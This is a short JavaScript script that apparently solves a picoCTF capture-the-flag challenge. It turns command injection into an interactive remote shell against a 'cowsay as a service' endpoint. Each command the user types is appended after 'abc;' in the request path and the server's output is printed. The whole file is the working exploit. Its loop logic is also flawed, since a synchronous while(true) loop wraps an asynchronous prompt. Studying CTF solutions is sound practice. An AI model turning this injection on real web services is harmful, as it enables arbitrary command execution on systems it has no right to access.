const readline = require('readline').createInterface({
    input: process.stdin,
    output: process.stdout,
  });
const url = "https://caas.mars.picoctf.net";

const get_cmd = (comand) => {
    fetch(url+"/cowsay/abc;"+comand).then(text => text.text())
    .then(text => {
        console.log(text.substring(145, text.length-1));
    })
}

while (true) {
    readline.question("Enter command: ", (cmd) => {
        cmd = encodeURIComponent(cmd);
        get_cmd(cmd);
        readline.close();
    });
}

